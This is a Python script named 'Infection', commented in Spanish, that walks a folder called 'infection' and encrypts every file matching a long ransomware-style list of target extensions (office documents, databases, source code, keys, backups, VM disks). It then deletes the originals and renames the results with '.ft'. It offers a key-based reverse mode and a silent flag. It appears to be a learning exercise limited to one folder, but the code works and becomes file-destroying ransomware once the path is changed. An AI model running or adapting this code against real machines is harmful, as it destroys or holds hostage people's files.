import sys
import argparse
import os
import getpass
import base64
import hashlib
from cryptography.fernet import Fernet

target_extensions = [
".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".pdf", ".jpg", ".jpeg", ".png", ".txt", ".csv", ".zip", ".rar", ".mp3", ".mp4", ".avi",
".der", ".pfx", ".key", ".crt", ".csr", ".p12", ".pem", ".odt", ".ott", ".sxw", ".stw", ".uot", ".3ds", ".max", ".3dm", ".ods", ".ots", ".sxc",
".stc", ".dif", ".slk", ".wb2", ".odp", ".otp", ".sxd", ".std", ".uop", ".odg", ".otg", ".sxm", ".mml", ".lay", ".lay6", ".asc", ".sqlite3",
".sqlitedb", ".sql", ".accdb", ".mdb", ".db", ".dbf", ".odb", ".frm", ".myd", ".myi", ".ibd", ".mdf", ".ldf", ".sln", ".suo", ".cs", ".c",
".cpp", ".pas", ".h", ".asm", ".js", ".cmd", ".bat", ".ps1", ".vbs", ".vb", ".pl", ".dip", ".dch", ".sch", ".brd", ".jsp", ".php", ".asp",
".rb", ".java", ".jar", ".class", ".sh", ".mp3", ".wav", ".swf", ".fla", ".wmv", ".mpg", ".vob", ".mpeg", ".asf", ".avi", ".mov", ".mp4",
".3gp", ".mkv", ".3g2", ".flv", ".wma", ".mid", ".m3u", ".m4u", ".djvu", ".svg", ".ai", ".psd", ".nef", ".tiff", ".tif", ".cgm", ".raw",
".gif", ".png", ".bmp", ".jpg", ".jpeg", ".vcd", ".iso", ".backup", ".zip", ".rar", ".7z", ".gz", ".tgz", ".tar", ".bak", ".tbk", ".bz2",
".PAQ", ".ARC", ".aes", ".gpg", ".vmx", ".vmdk", ".vdi", ".sldm", ".sldx", ".sti", ".sxi", ".602", ".hwp", ".snt", ".onetoc2", ".dwg",
".pdf", ".wk1", ".wks", ".123", ".rtf", ".csv", ".txt", ".vsdx", ".vsd", ".edb", ".eml", ".msg", ".ost", ".pst", ".potm", ".potx",
".ppam", ".ppsx", ".ppsm", ".pps", ".pot", ".pptm", ".pptx", ".ppt", ".xltm", ".xltx", ".xlc", ".xlm", ".xlt", ".xlw", ".xlsb", ".xlsm",
".xlsx", ".xls", ".dotx", ".dotm", ".dot", ".docm", ".docb", ".docx", ".doc"
]
# Crea un analizador de argumentos
parser = argparse.ArgumentParser(description='Infection: un programa de cifrado y descifrado de archivos.')

# Añade los argumentos
parser.add_argument('-v', '--version', action='version', version='%(prog)s 1.0')
parser.add_argument('-r', '--reverse', type=str, help='Revierte la infección utilizando la clave proporcionada')
parser.add_argument('-s', '--silent', action='store_true', help='Ejecuta el programa sin producir ningún output')

# Analiza los argumentos
args = parser.parse_args()

def get_encryption_key():
    encryption_key = getpass.getpass("Ingrese la clave de encriptación: ")
    if len(encryption_key) >= 16:
        encryption_key = base64.urlsafe_b64encode(hashlib.sha256(encryption_key.encode()).digest())
        return encryption_key
    else:
        print("La clave debe tener al menos 16 caracteres.")
        sys.exit()
    os.remove(file_path)

def encrypt_file(file_path, cipher_suite):
    with open(file_path, 'rb') as f:
        file_content = f.read()

    encrypted_content = cipher_suite.encrypt(file_content)

    file_name, file_extension = os.path.splitext(file_path)
    new_file_path = get_unique_file_path(file_name + file_extension + '.ft')

    with open(new_file_path, 'wb') as f:
        f.write(encrypted_content)

    os.remove(file_path)

def get_unique_file_path(file_path):
    if not os.path.exists(file_path):
        return file_path

    base_path, extension = os.path.splitext(file_path)
    index = 1
    new_file_path = f"{base_path}_{index}{extension}"
    while os.path.exists(new_file_path):
        index += 1
        new_file_path = f"{base_path}_{index}{extension}"

    return new_file_path

def decrypt_file(file_path, cipher_suite):
    with open(file_path, 'rb') as f:
        encrypted_content = f.read()

    decrypted_content = cipher_suite.decrypt(encrypted_content)

    new_file_path = remove_numeration(file_path[:-3])

    with open(new_file_path, 'wb') as f:
        f.write(decrypted_content)

    os.remove(file_path)

def remove_numeration(file_name):
    parts = file_name.split('_')
    return '_'.join(parts[:-1]) if parts[-1].isdigit() else file_name

if args.reverse:
    # Decrypt files
    encryption_key = base64.urlsafe_b64encode(hashlib.sha256(args.reverse.encode()).digest())
    cipher_suite = Fernet(encryption_key)

    for root, dirs, files in os.walk('infection'):
        for file in files:
            if file.endswith('.ft'):
                file_path = os.path.join(root, file)
                try:
                    decrypt_file(file_path, cipher_suite)
                    if not args.silent:
                        print(f"Archivo {file_path} descifrado.")
                except Exception as e:
                    if not args.silent:
                        print(f"Error al descifrar el archivo {file_path}: {e}")
else:
    # Encrypt files
    encryption_key = get_encryption_key()
    cipher_suite = Fernet(encryption_key)

    for root, dirs, files in os.walk('infection'):
        for file in files:
            if file.endswith(tuple(target_extensions)):
                file_path = os.path.join(root, file)
                try:
                    encrypt_file(file_path, cipher_suite)
                    if not args.silent:
                        print(f"Archivo {file_path} encriptado.")
                except Exception as e:
                    if not args.silent:
                        print(f"Error al encriptar el archivo {file_path}: {e}")
